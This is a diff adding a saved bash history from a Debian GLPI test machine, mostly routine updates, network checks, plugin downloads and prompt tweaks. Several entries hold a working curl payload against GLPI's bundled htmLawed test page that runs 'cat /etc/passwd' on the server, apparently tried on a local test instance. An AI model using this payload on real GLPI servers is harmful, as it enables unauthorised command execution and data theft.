@@ -1,0 +1,173 @@
+root@debian-glpi-test-stagiaire:/home/igp# cat nano.save
+    1 xprop 2 xprop WM_CLASS 3 apt update && apt upgrade 4
+    apt update 5 sudo apt update 6 sudo apt update && sudo
+    apt upgrade 7 sudo apt update 8 sudo apt-get update 9
+    sudo su
+   10 su 11 mount 12 hostname 13 hostname -I 14 tree 15 lsd
+   16 sl 17 man join 18 mpv 19 curl -s -d
+   'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo'
+   http://localhost/glpi/vendor/htmlawed/htmlawed/htmLawedTest.php
+   |egrep '\&nbsp;\[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp;
+   \[[0-9]+\] =\&gt; (.*)<br \/>/\1/' 20 cd Documents/ 21
+   ls 22 exec bash_glpi 23 exec ./bash_glpi 24 man curl 25
+   cat bash_glpi 26 curl -s -d 'sid=foo&hhook=exec&text=cat
+   /etc/passwd' -b 'sid=foo'
+   http://localhost/glpi/vendor/htmlawed/htmlawed/htmLawedTest.php
+   |egrep '\&nbsp;\[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp;
+   \[[0-9]+\] =\&gt; (.*)<br \/>/\1/' 27 curl -s -d
+   'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo'
+   http://0.0.0.0/glpi/front/phone.form.php | 28 curl -s -d
+   'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo'
+   http://0.0.0.0/glpi/front/phone.form.php 29 #curl -s -d
+   'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo'
+   http://0.0.0.0/glpi/front/phone.form.php 30 curl -s -d
+   'sid=foo&hhook=exec&text=cat /etc/passwd' 31 su - 32 ip
+   a 33 ip a 34 ping 8.8.8.8 35 ip -c a 36 sudo apt install
+   ssh 37 su - 38 cd /etc 39 ls -d 40 ls 41 apt search
+   putty 42 apt whoami 43 whoamits dhcp ghostscript init.d
+   libreoffice 44 alternatives chromium dictionaries-common
+   glvnd initramfs-tools lighttpd 45 anacrontab
+   console-setup discover.conf.d gnome inputrc locale.alias
+   46 apache2 cracklib discover-modprobe.conf gnome-chess
+   insserv.conf.d locale.gen 47 apcupsd cron.d
+   dleyna-server-service.conf groff ipp-usb localtime 48
+   apg.conf cron.daily dpkg group iproute2 logcheck 49
+   apparmor cron.hourly e2scrub.conf group- issue
+   login.defs 50 apparmor.d cron.monthly emacs grub.d
+   issue.net logrotate.con 51 appstream.conf crontab
+   environment gshadow kernel logrotate.d 52 apt
+   cron.weekly environment.d gshadow- kernel-img.conf
+   machine-id 53 avahi cups ethertypes gss ldap magic 54
+   bash.bashrc cupshelpers firefox-esr gtk-2.0 ld.so.cache
+   magic.mime 55 bash_completion dbconfig-common fonts
+   gtk-3.0 ld.so.conf mailcap 56 bindresvport.blacklist
+   dbus-1 fstab host.conf ld.so.conf.d mailcap.order 57
+   binfmt.d dconf fuse.conf hostname libao.conf
+   manpath.confi 58 bluetooth debconf.conf fwupd hosts
+   libaudit.conf mime.types 59 bogofilter.cf debian_version
+   gai.conf hosts.allow libblockdev mke2fs.conf 60
+   igp@debian-glpi-test-stagiaire:/etc$ apt search putty 61
+   En train de trier... Fait 62 Recherche en texte
+   intégral... Fait 63 libjsch-agent-proxy-java/oldstable
+   0.0.9-1 all 64 Proxy to ssh-agent and Pageant in Java 65
+   libtrilead-putty-extension-java/oldstable 1.2-2 all 66
+   PuTTY key support for Trilead SSH2 library 67
+   pterm/oldstable 0.74-1 amd64 68 émulateur de terminal
+   PuTTY 69 putty/oldstable 0.74-1 amd64 70 Telnet/SSH
+   client for X 71 putty-doc/oldstable 0.74-1 all 72 PuTTY
+   HTML documentation 73 putty-tools/oldstable 0.74-1 amd64
+   74 command-line tools for SSH, SCP, and SFTP 75
+   igp@debian-glpi-test-stagiaire:/etc$ apt 76 ts dhcp
+   ghostscript init.d libreoffice 77 alternatives chromium
+   dictionaries-common glvnd initramfs-tools lighttpd 78
+   anacrontab console-setup discover.conf.d gnome inputrc
+   locale.alias 79 apache2 cracklib discover-modprobe.conf
+   gnome-chess insserv.conf.d locale.gen 80 apcupsd cron.d
+   dleyna-server-service.conf groff ipp-usb localtime 81
+   apg.conf cron.daily dpkg group iproute2 logcheck 82
+   apparmor cron.hourly e2scrub.conf group- issue
+   login.defs 83 apparmor.d cron.monthly emacs grub.d
+   issue.net logrotate.con 84 appstream.conf crontab
+   environment gshadow kernel logrotate.d 85 apt
+   cron.weekly environment.d gshadow- kernel-img.conf
+   machine-id 86 avahi cups ethertypes gss ldap magic 87
+   bash.bashrc cupshelpers firefox-esr gtk-2.0 ld.so.cache
+   magic.mime 88 bash_completion dbconfig-common fonts
+   gtk-3.0 ld.so.conf mailcap 89 bindresvport.blacklist
+   dbus-1 fstab host.conf ld.so.conf.d mailcap.order 90
+   binfmt.d dconf fuse.conf hostname libao.conf
+   manpath.confi 91 bluetooth debconf.conf fwupd hosts
+   libaudit.conf mime.types 92 bogofilter.cf debian_version
+   gai.conf hosts.allow libblockdev mke2fs.conf 93
+   igp@debian-glpi-test-stagiaire:/etc$ apt search putty 94
+   En train de trier... Fait 95 Recherche en texte
+   intégral... Fait 96 libjsch-agent-proxy-java/oldstable
+   0.0.9-1 all 97 Proxy to ssh-agent and Pageant in Java 98
+   libtrilead-putty-extension-java/oldstable 1.2-2 all 99
+   PuTTY key support for Trilead SSH2 library
+  100 pterm/oldstable 0.74-1 amd64 101 émulateur de
+  terminal PuTTY 102 putty/oldstable 0.74-1 amd64 103
+  Telnet/SSH client for X 104 putty-doc/oldstable 0.74-1
+  all 105 PuTTY HTML documentation 106
+  putty-tools/oldstable 0.74-1 amd64 107 command-line tools
+  for SSH, SCP, and SFTP 108
+  igp@debian-glpi-test-stagiaire:/etc$ apt 109 whoamits 110
+  clear 111 _ 8 112 hostname -I 113 hostname -i 114 ip -c a
+  115 ping 1.1.1.1 116 sudo nano /etc/resolv.conf 117 su -
+  118 exit 119 su 120 tmux 121 ip a 122 su 123 hostname -I
+  124 vi 125
+  #https://github.com/pluginsGLPI/fields/releases/download/1.20.6/glpi-fields-1.20.6.tar.bz2
+  126 ls 127 ls -a 128 cd / 129 ls 130 ls srv 131 ls var
+  132 ls var/www/ 133 cd var/www/html/ 134 ls 135 cd glpi
+  136 ls 137 cd plugins/ 138 ls 139 #wget
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.zip
+  140 wget 141 wget -q -c --show-progress
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.zip
+  142 ls 143 wget -q -c --show-progress
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.zip
+  144 wget
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.zip
+  145 ls 146 ls -a 147 curl
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.zip
+  148 ls 149 curl
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.tar.gz
+  150 ping 1.1.1.1 151 curl
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.tar.gz
+  152 wget -q -c --show-progress
+  https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.zip
+  153 wget -q -c --show-progress
+  https://github.com/pluginsGLPI/fields/releases/download/1.20.6/glpi-fields-1.20.6.tar.bz2"
+  154 ls 155 wget -q -c --show-progress
+  "https://github.com/pluginsGLPI/fields/archive/refs/tags/1.20.6.zip"
+  156 su 157 ls 158 10pwd 159 pwd 160 exit 161 tree 162 cd
+  var/www/html/ 163 cd /var/www/html/ 164 cd glpi/ 165 cd
+  plugins/ 166 ls 167 lamp 168 lampp 169 cd 170 ls 171 ls
+  /opt 172 ls -a /opt 173 apt install composer 174 su 175
+  history | grep -i field 176 history 177 dsic 178 cd
+  Documents/ 179 ls 180 ./bash_glpi 181 route 182 su 183 su
+  - 184 su 185 exit 186 tree 187 rar 188 unrar 189 urar 190
+  open "Images/Capture d’écran de 2023-06-12 16-35-47.png"
+  191 cd /var/www/html/ 192 ls 193
+  sftp://igp@10.1.3.99/home/igp 194 pwd 195 cd 196 pwd 197
+  sftp sftp://10.1.3.99:22/home/igp 198
+  #sftp://igp@10.1.3.99:22/home/igp/
+  199 exit 200 echo $HISTSIZE 201 reset 202 bash 203 init
+  204 man reset 205 rerenice 206 renice 207 renice --help
+  208 sudo nano /etc/resolv.conf 209 cat /etc/resolv.conf
+  210 echo $HISTSIZE 211 bash 212 cat /etc/resolv.conf 213
+  #wget -q -c --show-progress
+  https://github.com/pluginsGLPI/fields/releases/download/1.20.6/glpi-fields-1.20.6.tar.bz2"
+  214 echo $HISTSIZE 215 history | grep github 216 history
+  | grep github | grep -iv fields
+  217 history | grep github | igrep -v fields 218 history |
+  grep github | grep -i -v fields 219 uzip 220 unzip 221
+  zip 222 history | grep "{" 223 man history 224 vim
+  .bashrc 225 #grep -C # .bashrc 226 vim .bashrc 227 grep
+  -C 3 "# check" .bashrc 228 grep -C 4 "# check" .bashrc
+  229 vim .bashrc 230 grep -B 4 "# check" .bashrc 231 grep
+  -B 3 "# check" .bashrc 232 grep -A 3 "# check" .bashrc
+  233 ls 234 ls /var/www/html/glpi 235 ls /var/www/html/
+  236 history 237 cat .bash_history 238 view 239 viewres
+  240 viewres 241 php --version 242 tree 243 apt 244 ls 245
+  rocket 246 ls 247 exit 248 ls 249 vim glpi 250 exit 251
+  vim glpi 252 cat glpi 253 tmux 254 exit 255 ls
+  256  mmm
+ exit 257 exit 258 PS1="\[\e]0;\u@\h:
+  \w\a\]${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$"
+  259 title () { if [[ -z "$ORIG" ]]; then ORIG=$PS1; fi;
+  TITLE="\[\e]2;$*\a\]"; PS1=${ORIG}${TITLE}; } 260 title
+  num 261 tmux ls 262 num 2 263 num 10 264
+  PS1="\[\e]0;\u@\h:
+  \w\a\]${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$"
+  265 title () { if [[ -z "$ORIG" ]]; then ORIG=$PS1; fi;
+  TITLE="\[\e]2;$*\a\]"; PS1=${ORIG}${TITLE}; } 266 cat
+  glpi 267 serie() { cut -d" " -f1 glpi | sed -n ${1}p; }
+  268 tmux ls 269 serie 2 270 serie 10 271 ls 272 vim glpi
+  273 cat glpi 274 echo -e "\n\n"; cat glpi 275 ls 276 0
+  277 serie() { cut -d" " -f1 glpi | sed -n ${1}p; } 278
+  cat glpi 279 cat glpi 280 bash 281 ps1 282 echo $PS1 283
+  tmux 284 ls 285 tree 286 exit 287 serie() { cut -d" " -f1
+  glpi | sed -n ${1}p; } 288 exit 289 num() { cut -d" " -f2
+  glpi| sed -n ${1}p; } 290 num 291 num 11 292 num 12 293
+  num 13 294 history | grep sourc 295 cat
+  /etc/apt/sources.list 296 history |nano
